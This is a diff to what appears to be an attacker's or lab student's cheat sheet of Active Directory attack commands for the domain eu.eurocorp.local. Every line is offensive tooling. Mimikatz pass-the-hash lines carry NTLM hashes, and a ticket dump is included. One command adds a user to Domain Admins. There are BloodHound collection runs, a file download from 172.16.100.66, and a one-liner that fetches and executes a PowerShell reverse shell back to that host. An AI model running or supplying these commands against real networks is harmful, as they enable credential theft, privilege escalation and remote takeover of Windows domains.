@@ -2890,9 +2890,12 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:SQLTELEMETRY /domain:eu.eurocorp.
 
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:dbadmin /domain:eu.eurocorp.local /ntlm:0553b02b95f64f7a3c27b9029d105c27 /run:powershell.exe"'
 
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:eu.eurocorp.local /ntlm:cdcfd73ba273d2b6ab67f1fecd83e88e /run:powershell.exe"'
+
+
 net group "Domain Admins" dbadmin /ADD /DOMAIN
 
-(New-Object System.Net.WebClient).DownloadFile("http://172.16.100.66/nc.exe", "C:\Users\dbadmin\Documents\nc.exe")
+(New-Object System.Net.WebClient).DownloadFile("http://172.16.100.66/SharpHound.ps1", "C:\Users\dbadmin\Documents\SharpHound.ps1")
 
 powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.66/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.66  -Port 443"
 
@@ -2920,3 +2923,6 @@ Invoke-Bloodhound -CollectionMethod All -Domain eu.eurocorp.local
 .\SharpHound.exe  --disablekerberossigning --CollectionMethod All --Domain eu.eurocorp.local
 
 Invoke-BloodHound -CollectionMethod All -Domain eu.eurocorp.local
+
+
+Invoke-Mimikatz -Command '"sekurlsa::tickets"'
